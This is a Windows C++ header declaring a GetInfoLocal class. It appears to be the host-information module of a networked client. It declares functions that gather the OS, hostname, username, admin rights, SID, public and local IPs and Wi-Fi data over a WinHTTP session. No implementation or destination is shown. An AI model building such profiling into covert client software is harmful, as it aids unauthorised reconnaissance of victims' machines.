
#pragma once
#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <string>
#include <Shlobj.h>
#include <sddl.h>
#include <winhttp.h>
#include <windows.h>
#include <algorithm>
#include <iptypes.h>
#include <iphlpapi.h>
#include "PublicStructures.h"
#include "HttpRequests.h"
#include "Utils.h"
#include "Wifi.h"


#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

using namespace std;
#pragma comment(lib, "Winhttp")
#pragma comment(lib, "IPHLPAPI.lib")


class GetInfoLocal
{
public:

	HINTERNET session;

	GetInfoLocal(HINTERNET clientRequestSession);

private:

	struct fullHostname {
		string computername;
		string username;
	};

	fullHostname tempStructer;

	Wifi Wifi;

	string getOs();

	void getHostName();

	string ifAdmin();

	string GetClientSID(string username);

	string getPublicIP();

	vector<string> getLocalIP();


public:

	struct PublicStructers::client get_local_info();

	string full_network_info();
};

